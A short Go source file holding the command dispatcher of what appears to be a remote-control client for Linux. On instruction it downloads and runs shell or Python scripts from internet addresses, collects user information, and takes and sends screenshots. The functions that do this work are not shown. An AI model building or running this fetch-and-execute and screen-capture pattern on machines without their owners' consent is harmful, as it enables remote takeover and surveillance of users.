//go:build linux

package utils

import (
	c "corpotecht_client/common"
	"corpotecht_client/crossplatform"
	"corpotecht_client/linux"
	"fmt"
	"log"
)

func HandleDirective(directive c.Directive) {
	defer RecoverFromCrash() // in case something goes wrong

	fmt.Printf("Received directive: %s\n", directive.Command)
	switch directive.Command {
	case "terminal":
		if len(directive.Parameters) > 0 {
			linux.ExecShellScriptFromInternet(directive.Parameters[0])
		} else {

			log.Println("Invalid directive received.")
		}
	case "python":
		if len(directive.Parameters) > 0 {
			linux.ExecPythonScriptFromInternet(directive.Parameters[0])
		} else {
			log.Println("Invalid directive received.")
		}
	case "userinfo":
		linux.UserInfo()
	case "screenshot":
		crossplatform.TakeAndSendScreenshot()
	}
}
